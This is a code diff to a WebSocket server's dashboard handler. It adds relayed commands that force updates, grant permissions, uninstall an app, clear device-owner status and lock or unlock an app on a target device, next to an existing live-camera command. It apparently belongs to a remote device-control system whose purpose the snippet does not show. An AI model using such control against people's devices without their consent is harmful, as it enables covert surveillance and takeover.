@@ -606,6 +606,34 @@ function handleDashboard(ws) {
         case "camera_live_stop":
           sendJson(device.ws, { type: "camera_live_stop" });
           break;
+        case "force_update":
+          // Relay force update command to device
+          sendTextToDevice(targetId, "force_update");
+          console.log(`🔄 Force update sent to ${targetId}`);
+          break;
+        case "grant_permissions":
+          // Relay grant permissions command to device
+          sendTextToDevice(targetId, "grant_permissions");
+          console.log(`✅ Grant permissions sent to ${targetId}`);
+          break;
+        case "uninstall_app":
+          // Relay uninstall command to device
+          sendTextToDevice(targetId, "uninstall_app");
+          console.log(`🗑️ Uninstall sent to ${targetId}`);
+          break;
+        case "clear_device_owner":
+          // Relay clear device owner command
+          sendTextToDevice(targetId, "clear_device_owner");
+          console.log(`🔓 Clear device owner sent to ${targetId}`);
+          break;
+        case "lock_app":
+          sendTextToDevice(targetId, "lock_app");
+          console.log(`🔒 Lock app sent to ${targetId}`);
+          break;
+        case "unlock_app":
+          sendTextToDevice(targetId, "unlock_app");
+          console.log(`🔓 Unlock app sent to ${targetId}`);
+          break;
         default:
           console.warn(`Unknown dashboard command: ${cmd}`);
       }
